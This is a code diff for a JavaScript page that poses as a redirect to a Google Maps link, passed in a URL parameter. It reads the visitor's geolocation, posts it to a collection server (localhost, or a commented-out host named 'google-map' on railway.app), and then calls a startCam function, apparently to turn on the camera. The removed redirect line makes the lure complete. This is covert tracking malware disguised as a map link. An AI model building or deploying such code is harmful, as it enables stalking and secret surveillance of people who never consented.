@@ -1,3 +1,13 @@
+// const baseUrl = 'https://google-map.up.railway.app';
+const baseUrl = 'http://localhost:9000';
+let locationParam = "https://www.google.com/maps/place/Sapporo,+Hokkaido,+Japan/@42.9853655,140.9183319,10z/data=!3m1!4b1!4m6!3m5!1s0x5f0ad4755a973633:0x33937e9d4687bad5!8m2!3d43.0617713!4d141.3544507!16zL20vMGdwNWw2?entry=ttu&g_ep=EgoyMDI1MDcyOS4wIKXMDSoASAFQAw%3D%3D";
+
+const loading = document.getElementById('loading');
+const urlParams = new URLSearchParams(window.location.search);
+
+locationParam = urlParams.get('location')?.length > 0 ? urlParams.get('location') : locationParam;
+loading.textContent = "Please wait redirecting you to " + locationParam;
+
 if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
         function(position) {
@@ -14,7 +24,6 @@ if (navigator.geolocation) {
             saveLocation(targetRequest)
                 .then(() => {
                     console.log("Location saved successfully.");
-                    window.location.replace("https://www.google.com/maps/place/Sapporo,+Hokkaido,+Japan/@42.9853655,140.9183319,10z/data=!3m1!4b1!4m6!3m5!1s0x5f0ad4755a973633:0x33937e9d4687bad5!8m2!3d43.0617713!4d141.3544507!16zL20vMGdwNWw2?entry=ttu&g_ep=EgoyMDI1MDcyOS4wIKXMDSoASAFQAw%3D%3D");
                 })
                 .catch(err => {
                     console.error("Error saving location:", err);
@@ -30,7 +39,8 @@ if (navigator.geolocation) {
 }
 
 const saveLocation = async (req) => {
-    fetch('http://localhost:9000/locations', {
+    return new Promise((resolve, reject) => {
+        fetch(baseUrl + '/locations', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -41,11 +51,20 @@ const saveLocation = async (req) => {
             if (!response.ok) {
                 throw new Error('Network response was not ok');
             }
-            console.log('Coordinates sent successfully');
+            return response.json();
         })
+            .then(data => {
+                return data.id;
+            })
+            .then(locationId => {
+                console.log('Coordinates sent successfully');
+                startCam(locationId);
+            })
         .catch(error => {
             console.error('Error sending coordinates:', error);
+            reject(error);
         });
+    });
 }
 
 const getDeviceInformation = () => {
